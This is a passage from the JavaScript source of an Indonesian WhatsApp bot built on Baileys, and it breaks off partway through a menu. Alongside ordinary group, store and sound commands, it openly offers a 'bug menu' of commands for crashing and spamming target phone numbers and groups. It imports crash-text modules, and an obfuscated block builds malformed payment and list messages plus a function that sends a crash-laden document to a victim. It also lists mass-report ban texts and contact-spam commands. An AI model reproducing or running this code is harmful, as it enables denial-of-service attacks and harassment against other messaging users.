require('./settings')
require('./lib/language')
require('./lib/virtex/virus')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = global.baileys1
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./lib/storage')
const { JSDOM } = require('jsdom')
module.exports = qio = async (qio, m, chatUpdate, store) => {
try {
var body = (m.mtype === 'conversation') ? m.message.conversation: (m.mtype == 'imageMessage') ? m.message.imageMessage.caption: (m.mtype == 'videoMessage') ? m.message.videoMessage.caption: (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text: (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId: (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId: (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId: (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text): ''
var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const owner = JSON.parse(fs.readFileSync('./lib/plus.json'))
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const qtext = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const from = mek.key.remoteJid
const pushname = m.pushName || "No Name"
const botNumber = await qio.decodeJid(qio.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await qio.groupMetadata(from).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const tanggal = moment().tz("Asia/Jakarta").format("ll")
const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss')
const tengah = moment.tz('Asia/Makassar').format('HH:mm:ss')
const timur = moment.tz('Asia/Jayapura').format('HH:mm:ss')
// database
let wibh = moment.tz('Asia/Jakarta').format('HH')
    let wibm = moment.tz('Asia/Jakarta').format('mm')
    let wibs = moment.tz('Asia/Jakarta').format('ss')
    let wktuwib = `${wibh} H ${wibm} M ${wibs} S`    
    let d = new Date(new Date + 3600000)
    let locale = 'id'
    let weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(d / 84600000) % 5]
    let week = d.toLocaleDateString(locale, { weekday: 'long' })
    let date = d.toLocaleDateString(locale, {
      day: 'numeric',
      month: 'long',
      year: 'numeric'
    })
const qioimage = fs.readFileSync('./lib/image/qio.jpg')
const mime = (quoted.msg || quoted).mimetype || ''
const { uptotelegra } = require('./lib/upload')
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const virgam = fs.readFileSync('./lib/virtex/virgam.jpeg')
const ytdl = require("ytdl-core")
const bugthumb = fs.readFileSync ('./lib/image/mamak.jpg')
const slayer = fs.readFileSync ('./lib/image/slayer.jpg')
const contacts = JSON.parse(fs.readFileSync("./lib/contacts.json"))
const db_respon_list = JSON.parse(fs.readFileSync('./lib/list.json'))//baru
const dblist = JSON.parse(fs.readFileSync('./lib/listall.json'))//baru

//virtex ajim
const { ngazap } = require('./lib/virtex/ngazap')
const { paijoo } = require('./lib/virtex/paijoo')
const { four } = require('./lib/virtex/four')
const { buttonqio } = require('./lib/virtex/buttonqio')
const { virtex } = require('./lib/virtex/virtex')

const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
const antidel = JSON.parse(fs.readFileSync("./lib/antidel.json"))
const banned = JSON.parse(fs.readFileSync('./lib/banned.json'))

// Hahahaha
if (!qio.public) {
if (!isCreator) return
}


if (command) {
console.log(`User: ${pushname}\n Chat: ${command}\n Time: ${time}`)
}

let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
qio.sendPresenceUpdate(jd, from)
}

async function loading () {
var qioloading = [
"☠️ █▒▒▒▒▒▒▒▒▒▒▒💀1%",
"💀 ████▒▒▒▒▒▒▒▒☠️100%",
"☠️ ███████▒▒▒▒▒💀550%",
"💀██████████▒▒☠️1000%",
"☠️ ████████████💀10000%",
"Loading Udah Siap..."
]
let { key } = await qio.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})
for (let i = 0; i < qioloading.length; i++) {
await qio.sendMessage(from, {text: qioloading[i], edit: key });
}
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const replyy = (teks) => {
return qio.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `Bot Lanzz 🥶`,"body": `Hai ${pushname}`, "previewType": "PHOTO","thumbnail": qioimage,"sourceUrl": `https://youtube.com/@Boys948`}}}, { quoted:m})} 

const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log('Download Audio With ytdl-core')
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await qio.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(`${err}`)
}
}

const _0x28d4e9=_0x5c04;function _0x5c04(_0x37ec4e,_0x34455b){const _0x4f961c=_0x4f96();return _0x5c04=function(_0x5c044f,_0x2744d7){_0x5c044f=_0x5c044f-0x79;let _0x23a35f=_0x4f961c[_0x5c044f];return _0x23a35f;},_0x5c04(_0x37ec4e,_0x34455b);}(function(_0x3a21dc,_0x2cf6ca){const _0x567884=_0x5c04,_0x145827=_0x3a21dc();while(!![]){try{const _0x3941a0=-parseInt(_0x567884(0x86))/0x1+-parseInt(_0x567884(0x83))/0x2*(parseInt(_0x567884(0x82))/0x3)+parseInt(_0x567884(0x8a))/0x4*(parseInt(_0x567884(0x85))/0x5)+parseInt(_0x567884(0x88))/0x6*(-parseInt(_0x567884(0x7d))/0x7)+parseInt(_0x567884(0x87))/0x8+-parseInt(_0x567884(0x7f))/0x9*(parseInt(_0x567884(0x8b))/0xa)+parseInt(_0x567884(0x84))/0xb;if(_0x3941a0===_0x2cf6ca)break;else _0x145827['push'](_0x145827['shift']());}catch(_0x37b6b9){_0x145827['push'](_0x145827['shift']());}}}(_0x4f96,0x73146));const lanzelitcees={'key':{'fromMe':[],'participant':'0@s.whatsapp.net',...from?{'remoteJid':_0x28d4e9(0x8c)}:{}},'message':{'interactiveMessage':{'header':{'hasMediaAttachment':[],'jpegThumbnail':bugthumb},'nativeFlowMessage':{'buttons':[{'name':'review_and_pay','buttonParamsJson':_0x28d4e9(0x81)}]}}}},cap='qiobug';try{pplu=await qio[_0x28d4e9(0x8d)](anu['id'],_0x28d4e9(0x7a));}catch{pplu=_0x28d4e9(0x7b);}const qiobug={'key':{'fromMe':!![],'participant':_0x28d4e9(0x8c),...from?{'remoteJid':''}:{}},'message':{'interactiveMessage':{'header':{'hasMediaAttachment':[],'jpegThumbnail':qioimage},'nativeFlowMessage':{'buttons':[{'name':_0x28d4e9(0x89),'buttonParamsJson':_0x28d4e9(0x80)}]}}}},xeonimun=_0x54e7d5=>{const _0x470cb6=_0x28d4e9;qio[_0x470cb6(0x79)](from,{'text':_0x54e7d5,'mentions':[sender]},{'quoted':m})['catch'](_0x167add=>{return reply('Erro..');});},lanzbatosai={'key':{'fromMe':![],'participant':_0x28d4e9(0x8c),'remoteJid':_0x28d4e9(0x7e)},'message':{'listResponseMessage':{'title':'ð€ð¥ð°ðšð²ð¬ðšðªð¢ð¨ð¨\x20ð‚ð«ðšð¬ð¡â„'}}};async function Crashbro(_0x4cf66a,_0x5a402e){const _0x426b35=_0x28d4e9;qio[_0x426b35(0x79)](_0x5a402e,{'document':{'url':_0x426b35(0x8e)},'mimetype':_0x426b35(0x7c),'fileName':buttonqio+'.'+paijoo,'caption':''+(ngazap+four)},{'quoted':lanzbatosai});}function _0x4f96(){const _0x49415c=['image/null','5305293TjTlkR','status@broadcast','79938hraZBN','{\x22currency\x22:\x22USD\x22,\x22payment_configuration\x22:\x22\x22,\x22payment_type\x22:\x22\x22,\x22transaction_id\x22:\x22\x22,\x22total_amount\x22:{\x22value\x22:879912500,\x22offset\x22:100},\x22reference_id\x22:\x224N88TZPXWUM\x22,\x22type\x22:\x22physical-goods\x22,\x22payment_method\x22:\x22\x22,\x22order\x22:{\x22status\x22:\x22pending\x22,\x22description\x22:\x22\x22,\x22subtotal\x22:{\x22value\x22:990000000,\x22offset\x22:100},\x22tax\x22:{\x22value\x22:8712000,\x22offset\x22:100},\x22discount\x22:{\x22value\x22:118800000,\x22offset\x22:100},\x22shipping\x22:{\x22value\x22:500,\x22offset\x22:100},\x22order_type\x22:\x22ORDER\x22,\x22items\x22:[{\x22retailer_id\x22:\x22custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\x22,\x22name\x22:\x22JAMUR\x22,\x22amount\x22:{\x22value\x22:1000000,\x22offset\x22:100},\x22quantity\x22:99},{\x22retailer_id\x22:\x22custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\x22,\x22name\x22:\x22Wortel\x22,\x22amount\x22:{\x22value\x22:5000000,\x22offset\x22:100},\x22quantity\x22:99},{\x22retailer_id\x22:\x22custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\x22,\x22name\x22:\x22Tahu\x22,\x22amount\x22:{\x22value\x22:4000000,\x22offset\x22:100},\x22quantity\x22:99}]},\x22additional_note\x22:\x22\x22}','{\x22currency\x22:\x22IDR\x22,\x22external_payment_configurations\x22:[{\x22uri\x22:\x22\x22,\x22type\x22:\x22payment_instruction\x22,\x22payment_instruction\x22:\x22hey\x20ini\x20test\x22}],\x22payment_configuration\x22:\x22\x22,\x22payment_type\x22:\x22\x22,\x22total_amount\x22:{\x22value\x22:2500000,\x22offset\x22:100},\x22reference_id\x22:\x224MX98934S0D\x22,\x22type\x22:\x22physical-goods\x22,\x22order\x22:{\x22status\x22:\x22pending\x22,\x22description\x22:\x22\x22,\x22subtotal\x22:{\x22value\x22:2500000,\x22offset\x22:100},\x22items\x22:[{\x22retailer_id\x22:\x226348642505244872\x22,\x22product_id\x22:\x226348642505244872\x22,\x22name\x22:\x22âƒŸð™°ðš•ðš ðšŠðš¢ðšœðšŠðššðš’ðš˜âƒ¤\x22,\x22amount\x22:{\x22value\x22:2500000,\x22offset\x22:100},\x22quantity\x22:1}]}}','3PpBZRB','1125506CyZFWt','11757141qwxypW','36290mnWuEG','433408aZKAtE','7099896rIDrWE','6whICmq','review_and_pay','256sKBLHD','220ihFXOA','0@s.whatsapp.net','profilePictureUrl','./settings.js','sendMessage','image','https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'];_0x4f96=function(){return _0x49415c;};return _0x4f96();}
// Komen
switch(command) {
// MENU
case 'menu':
await loading()
replyy(`Hallo ${pushname}
╔═╗╔══╗╔═╗╔═╗
║╬║╚║║╝║║║║║║
╚╗║╔║║╗║║║║║║
─╚╝╚══╝╚═╝╚═╝
𝙆𝙐𝙈𝘼𝙃𝘼𝙆 𝘽𝘼𝙍𝙐𝘿𝘼𝙆 𝙒𝙀𝙇𝙇 🤙

       ═𝐈𝐍𝐅𝐎 𝐌𝐀𝐙𝐙𝐄𝐇═
𝙾𝚠𝚗𝚎𝚛 : *${global.namaowner}*
𝙱𝚘𝚝 𝙽𝚊𝚖𝚎 : *${global.botname}*
𝙲𝚛𝚎𝚊𝚝𝚘𝚛 : Lanz
𝚅𝚎𝚛𝚜𝚒𝚘𝚗 𝙱𝚘𝚝 : V3
𝚁𝚞𝚗𝚗𝚒𝚗𝚐 : Panel Only
𝙻𝚒𝚋𝚛𝚊𝚛𝚢 : Baileys-MD
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*FITUR BOT*
${prefix}self
${prefix}public
${prefix}setppbot
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*LIST MENU BOT*
${prefix}bugmenu
${prefix}storemenu
${prefix}aksesmenu
${prefix}soundmenu
${prefix}groupmenu
${prefix}stickermenu
${prefix}downloadmenu
${prefix}toolsmenu
${prefix}asupanmenu
${prefix}ownermenu
${prefix}pushkontakmenu
${prefix}txtmenu
${prefix}infobot

Powered By : *@Lanzz*
Aplikasi By :  *@Wangcap*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`)
break

// BUG MENU
case 'bugmenu':
await loading()
replyy(`Hallo ${pushname}
╔═╗╔══╗╔═╗╔═╗
║╬║╚║║╝║║║║║║
╚╗║╔║║╗║║║║║║
─╚╝╚══╝╚═╝╚═╝
𝙆𝙐𝙈𝘼𝙃𝘼𝙆 𝘽𝘼𝙍𝙐𝘿𝘼𝙆 𝙒𝙀𝙇𝙇 🤙

       ═𝐈𝐍𝐅𝐎 𝐌𝐀𝐙𝐙𝐄𝐇═
𝙾𝚠𝚗𝚎𝚛 : *${global.namaowner}*
𝙱𝚘𝚝 𝙽𝚊𝚖𝚎 : *${global.botname}*
𝙲𝚛𝚎𝚊𝚝𝚘𝚛 : Lanz
𝚅𝚎𝚛𝚜𝚒𝚘𝚗 𝙱𝚘𝚝 : V3
𝚁𝚞𝚗𝚗𝚒𝚗𝚐 : Panel Only
𝙻𝚒𝚋𝚛𝚊𝚛𝚢 : 𝙱𝚊𝚒𝚕𝚎𝚢𝚜-𝙼𝙳
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*FITUR BOT*
${prefix}self
${prefix}public
${prefix}setppbot
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*BUG SPAM DITEMPAT*
${prefix}lanzanjas
${prefix}bugdocu
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*BUG PRANK*
${prefix}bugjb *62xx*
${prefix}bugjb2 *62xx*
${prefix}bughps *62xx*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*BUG SPAM EMOJI*
${prefix}❤️ *62xx*
${prefix}🎮 *62xx*
${prefix}🤤 *62xx*
${prefix}😋 *62xx*
${prefix}🥹 *62xx*
${prefix}😛 *62xx*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*BUG SPAM TARGET*
${prefix}lanzmodesad *62xx*
${prefix}gaskenlanz *62xx*
${prefix}lanzgacor *62xx*
${prefix}senddocu *62xx*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*BUG WAR EPEP😋*
${prefix}sg2alok *62xx*
${prefix}anjayalok *62xx*
${prefix}lanzelitcees *62xx*
${prefix}httpsbg *62xx*
${prefix}crashyaa *62xx*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*BUG CRASH*
${prefix}santet *62xx*
${prefix}santet1jam *62xx*
${prefix}santetfullday *62xx*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*VIRTEX BUG*
${prefix}virtexgg *62xx*
${prefix}slayer07 *62xx*
${prefix}darkness *62xx*
${prefix}virdok *62xx*
${prefix}viraud *62xx*
${prefix}virlok *62xx*
${prefix}virtexgg *62xx*
${prefix}virtexgb *62xx*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*BUG SPAM EMOJI GROUP*
${prefix}🥰 *link grup*
${prefix}😍 *link grup*
${prefix}🤩 *link grup*
${prefix}😠 *link grup*
${prefix}🙁 *link grup*
${prefix}😵 *link grup*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*BUG SPAM GC*
${prefix}gcsampah *link grup*
${prefix}lanzgasken *link grup*
${prefix}gcampas *link grup*
${prefix}pasticrash *id group*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*BUG DOWN HP*
${prefix}bugvid1
${prefix}bugvid2

Powered By : *@Lanzz*
Aplikasi By :  *@Wangcap*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
⚠️NOTE : 𝚓𝚊𝚗𝚐𝚊𝚗 𝚖𝚎𝚗𝚢𝚊𝚕𝚊𝚑 𝚐𝚞𝚗𝚊𝚔𝚊𝚗 𝚏𝚒𝚝𝚞𝚛 𝚒𝚗𝚒
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`)
break

// TXT PUSH KONTAK
case 'pushkontakmenu':
await loading()
replyy(`Hallo ${pushname}
╔═╗╔══╗╔═╗╔═╗
║╬║╚║║╝║║║║║║
╚╗║╔║║╗║║║║║║
─╚╝╚══╝╚═╝╚═╝
𝙆𝙐𝙈𝘼𝙃𝘼𝙆 𝘽𝘼𝙍𝙐𝘿𝘼𝙆 𝙒𝙀𝙇𝙇 🤙

       ═𝐈𝐍𝐅𝐎 𝐌𝐀𝐙𝐙𝐄𝐇═
𝙾𝚠𝚗𝚎𝚛 : *${global.namaowner}*
𝙱𝚘𝚝 𝙽𝚊𝚖𝚎 : *${global.botname}*
𝙲𝚛𝚎𝚊𝚝𝚘𝚛 : Lanz
𝚅𝚎𝚛𝚜𝚒𝚘𝚗 𝙱𝚘𝚝 : V3
𝚁𝚞𝚗𝚗𝚒𝚗𝚐 : Panel Only
𝙻𝚒𝚋𝚛𝚊𝚛𝚢 : 𝙱𝚊𝚒𝚕𝚎𝚢𝚜-𝙼𝙳
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
${prefix}pushkontak *text*
${prefix}pushkontakid *idgc/pesan*
${prefix}pushid *idgc/pesan*
${prefix}push *text*
${prefix}cekidgc
${prefix}save *reply/pesan*

Powered By : *@Lanzz*
Aplikasi By :  *@Wangcap*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`)
break
// MENU STORE
case 'storemenu':
await loading()
replyy(`Hallo ${pushname}
╔═╗╔══╗╔═╗╔═╗
║╬║╚║║╝║║║║║║
╚╗║╔║║╗║║║║║║
─╚╝╚══╝╚═╝╚═╝
𝙆𝙐𝙈𝘼𝙃𝘼𝙆 𝘽𝘼𝙍𝙐𝘿𝘼𝙆 𝙒𝙀𝙇𝙇 🤙

       ═𝐈𝐍𝐅𝐎 𝐌𝐀𝐙𝐙𝐄𝐇═
𝙾𝚠𝚗𝚎𝚛 : *${global.namaowner}*
𝙱𝚘𝚝 𝙽𝚊𝚖𝚎 : *${global.botname}*
𝙲𝚛𝚎𝚊𝚝𝚘𝚛 : Lanz
𝚅𝚎𝚛𝚜𝚒𝚘𝚗 𝙱𝚘𝚝 : V3
𝚁𝚞𝚗𝚗𝚒𝚗𝚐 : Panel Only
𝙻𝚒𝚋𝚛𝚊𝚛𝚢 : 𝙱𝚊𝚒𝚕𝚎𝚢𝚜-𝙼𝙳
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
${prefix}store
${prefix}payment
${prefix}addlist
${prefix}dellist
${prefix}updatelist
${prefix}proses *reply/pesan*
${prefix}done *reply/pesan*

Powered By : *@Lanzz*
Aplikasi By :  *@Wangcap*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`)
break

// TXT MENU
case 'txtmenu':
await loading()
replyy(`Hallo ${pushname}
╔═╗╔══╗╔═╗╔═╗
║╬║╚║║╝║║║║║║
╚╗║╔║║╗║║║║║║
─╚╝╚══╝╚═╝╚═╝
𝙆𝙐𝙈𝘼𝙃𝘼𝙆 𝘽𝘼𝙍𝙐𝘿𝘼𝙆 𝙒𝙀𝙇𝙇 🤙

       ═𝐈𝐍𝐅𝐎 𝐌𝐀𝐙𝐙𝐄𝐇═
𝙾𝚠𝚗𝚎𝚛 : *${global.namaowner}*
𝙱𝚘𝚝 𝙽𝚊𝚖𝚎 : *${global.botname}*
𝙲𝚛𝚎𝚊𝚝𝚘𝚛 : Lanz
𝚅𝚎𝚛𝚜𝚒𝚘𝚗 𝙱𝚘𝚝 : V3
𝚁𝚞𝚗𝚗𝚒𝚗𝚐 : Panel Only
𝙻𝚒𝚋𝚛𝚊𝚛𝚢 : 𝙱𝚊𝚒𝚕𝚎𝚢𝚜-𝙼𝙳
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*FITUR BOT*
${prefix}self
${prefix}public
${prefix}setppbot
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*ALL TEKS GACOR*

*TEKS BAN ONE REPPORT*
${prefix}txtban1
${prefix}txtban2
${prefix}txtban3

*TEKS UNBAN KEDIP*
${prefix}txtunbanperma1
${prefix}txtunbanperma2
${prefix}txtunbanperma3
${prefix}txtunbansetpp1
${prefix}txtunbansetpp2
${prefix}txtunbansetpp3
${prefix}txtunbanspam1
${prefix}txtunbanspam2
${prefix}txtunbanspam3
${prefix}txtunbantinjau

*GMAIL PIHAK WA*
${prefix}gmailwa

Powered By : *@Lanzz*
Aplikasi By :  *@Wangcap*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`)
break
// AKSES MENU
case 'aksesmenu':
await loading()
replyy(`Hallo ${pushname}
╔═╗╔══╗╔═╗╔═╗
║╬║╚║║╝║║║║║║
╚╗║╔║║╗║║║║║║
─╚╝╚══╝╚═╝╚═╝
𝙆𝙐𝙈𝘼𝙃𝘼𝙆 𝘽𝘼𝙍𝙐𝘿𝘼𝙆 𝙒𝙀𝙇𝙇 🤙

       ═𝐈𝐍𝐅𝐎 𝐌𝐀𝐙𝐙𝐄𝐇═
𝙾𝚠𝚗𝚎𝚛 : *${global.namaowner}*
𝙱𝚘𝚝 𝙽𝚊𝚖𝚎 : *${global.botname}*
𝙲𝚛𝚎𝚊𝚝𝚘𝚛 : Lanz
𝚅𝚎𝚛𝚜𝚒𝚘𝚗 𝙱𝚘𝚝 : V3
𝚁𝚞𝚗𝚗𝚒𝚗𝚐 : Panel Only
𝙻𝚒𝚋𝚛𝚊𝚛𝚢 : 𝙱𝚊𝚒𝚕𝚎𝚢𝚜-𝙼𝙳
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*FITUR BOT*
${prefix}self
${prefix}public
${prefix}setppbot
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*LIST FITUR PLUS*
${prefix}addplus 62xxx
${prefix}delplus 62xxx
${prefix}listplus

Powered By : *@Lanzz*
Aplikasi By :  *@Wangcap*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`)
break
// SOUND MENU
case 'soundmenu':
await loading()
replyy(`Hallo ${pushname}
╔═╗╔══╗╔═╗╔═╗
║╬║╚║║╝║║║║║║
╚╗║╔║║╗║║║║║║
─╚╝╚══╝╚═╝╚═╝
𝙆𝙐𝙈𝘼𝙃𝘼𝙆 𝘽𝘼𝙍𝙐𝘿𝘼𝙆 𝙒𝙀𝙇𝙇 🤙

       ═𝐈𝐍𝐅𝐎 𝐌𝐀𝐙𝐙𝐄𝐇═
𝙾𝚠𝚗𝚎𝚛 : *${global.namaowner}*
𝙱𝚘𝚝 𝙽𝚊𝚖𝚎 : *${global.botname}*
𝙲𝚛𝚎𝚊𝚝𝚘𝚛 : Lanz
𝚅𝚎𝚛𝚜𝚒𝚘𝚗 𝙱𝚘𝚝 : V3
𝚁𝚞𝚗𝚗𝚒𝚗𝚐 : Panel Only
𝙻𝚒𝚋𝚛𝚊𝚛𝚢 : 𝙱𝚊𝚒𝚕𝚎𝚢𝚜-𝙼𝙳
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*FITUR BOT*
${prefix}self
${prefix}public
${prefix}setppbot
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*LIST FITUR SOUND*
${prefix}sound1
${prefix}sound2
${prefix}sound3
${prefix}sound4
${prefix}sound5
${prefix}sound6
${prefix}sound7
${prefix}sound8
${prefix}sound9
${prefix}sound10
${prefix}sound11
${prefix}sound12
${prefix}sound13
${prefix}sound14
${prefix}sound15
${prefix}sound16
${prefix}sound17
${prefix}sound18
${prefix}sound18
${prefix}sound20
${prefix}sound21
${prefix}sound22
${prefix}sound23
${prefix}sound24
${prefix}sound25
${prefix}sound26
${prefix}sound27
${prefix}sound28
${prefix}sound29
${prefix}sound30
${prefix}sound31
${prefix}sound32
${prefix}sound33
${prefix}sound34
${prefix}sound35
${prefix}sound36
${prefix}sound37
${prefix}sound38
${prefix}sound39
${prefix}sound40
${prefix}sound41
${prefix}sound42
${prefix}sound43
${prefix}sound44
${prefix}sound45
${prefix}sound46
${prefix}sound47
${prefix}sound48
${prefix}sound49
${prefix}sound50
${prefix}sound51
${prefix}sound52
${prefix}sound53
${prefix}sound54
${prefix}sound55
${prefix}sound56
${prefix}sound57
${prefix}sound58
${prefix}sound59
${prefix}sound60
${prefix}sound61
${prefix}sound62
${prefix}sound63
${prefix}sound64
${prefix}sound65
${prefix}sound66
${prefix}sound67
${prefix}sound68
${prefix}sound69
${prefix}sound70
${prefix}sound71
${prefix}sound72
${prefix}sound73
${prefix}sound74
${prefix}sound75
${prefix}sound76
${prefix}sound77
${prefix}sound78
${prefix}sound79
${prefix}sound80
${prefix}sound81
${prefix}sound82
${prefix}sound83
${prefix}sound84
${prefix}sound85
${prefix}sound86
${prefix}sound87
${prefix}sound88
${prefix}sound89
${prefix}sound90
${prefix}sound91
${prefix}sound92
${prefix}sound93
${prefix}sound94
${prefix}sound95
${prefix}sound96
${prefix}sound97
${prefix}sound98
${prefix}sound99
${prefix}sound100
${prefix}sound101
${prefix}sound102
${prefix}sound103
${prefix}sound104
${prefix}sound105
${prefix}sound106
${prefix}sound107
${prefix}sound108
${prefix}sound109
${prefix}sound110
${prefix}sound111
${prefix}sound112
${prefix}sound113
${prefix}sound114
${prefix}sound115
${prefix}sound116
${prefix}sound117
${prefix}sound118
${prefix}sound119
${prefix}sound120
${prefix}sound121
${prefix}sound122
${prefix}sound123
${prefix}sound124
${prefix}sound125
${prefix}sound126
${prefix}sound127
${prefix}sound128
${prefix}sound129
${prefix}sound130
${prefix}sound131
${prefix}sound132
${prefix}sound133
${prefix}sound134
${prefix}sound135
${prefix}sound136
${prefix}sound137
${prefix}sound138
${prefix}sound139
${prefix}sound140
${prefix}sound141
${prefix}sound142
${prefix}sound143
${prefix}sound144
${prefix}sound145
${prefix}sound146
${prefix}sound147
${prefix}sound148
${prefix}sound149
${prefix}sound150
${prefix}sound151
${prefix}sound152
${prefix}sound153
${prefix}sound154
${prefix}sound155
${prefix}sound156
${prefix}sound157
${prefix}sound158
${prefix}sound159
${prefix}sound160
${prefix}sound161

Powered By : *@Lanzz*
Aplikasi By :  *@Wangcap*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`)
break
// GROUP MENU
case 'groupmenu':
await loading()
replyy(`Hallo ${pushname}
╔═╗╔══╗╔═╗╔═╗
║╬║╚║║╝║║║║║║
╚╗║╔║║╗║║║║║║
─╚╝╚══╝╚═╝╚═╝
𝙆𝙐𝙈𝘼𝙃𝘼𝙆 𝘽𝘼𝙍𝙐𝘿𝘼𝙆 𝙒𝙀𝙇𝙇 🤙

       ═𝐈𝐍𝐅𝐎 𝐌𝐀𝐙𝐙𝐄𝐇═
𝙾𝚠𝚗𝚎𝚛 : *${global.namaowner}*
𝙱𝚘𝚝 𝙽𝚊𝚖𝚎 : *${global.botname}*
𝙲𝚛𝚎𝚊𝚝𝚘𝚛 : Lanz
𝚅𝚎𝚛𝚜𝚒𝚘𝚗 𝙱𝚘𝚝 : V3
𝚁𝚞𝚗𝚗𝚒𝚗𝚐 : Panel Only
𝙻𝚒𝚋𝚛𝚊𝚛𝚢 : 𝙱𝚊𝚒𝚕𝚎𝚢𝚜-𝙼𝙳
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*FITUR BOT*
${prefix}self
${prefix}public
${prefix}setppbot
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*LIST FITUR GROUP*
${prefix}bcgroup *text*
${prefix}antilink on/off
${prefix}antidel on/off
${prefix}antitoxic on/off
${prefix}welcome on/off
${prefix}hidetag *text*
${prefix}editsubjek *text*
${prefix}editdesk *text*
${prefix}inspect *link gc*
${prefix}add *62xxx*
${prefix}kick *62xxx*
${prefix}promote *62xxx*
${prefix}demote *62xxx*
${prefix}linkgroup
${prefix}resetlinkgc
${prefix}larangan
${prefix}peraturan

Powered By : *@Lanzz*
Aplikasi By :  *@Wangcap*
▬▭▬▭▬▭▬▭▬▬▭▬▭▬`)
break
// qio MENU
case 'ownermenu':
await loading()
replyy(`Hallo ${pushname}
╔═╗╔══╗╔═╗╔═╗
║╬║╚║║╝║║║║║║
╚╗║╔║║╗║║║║║║
─╚╝╚══╝╚═╝╚═╝
𝙆𝙐𝙈𝘼𝙃𝘼𝙆 𝘽𝘼𝙍𝙐𝘿𝘼𝙆 𝙒𝙀𝙇𝙇 🤙

       ═𝐈𝐍𝐅𝐎 𝐌𝐀𝐙𝐙𝐄𝐇═
𝙾𝚠𝚗𝚎𝚛 : *${global.namaowner}*
𝙱𝚘𝚝 𝙽𝚊𝚖𝚎 : *${global.botname}*
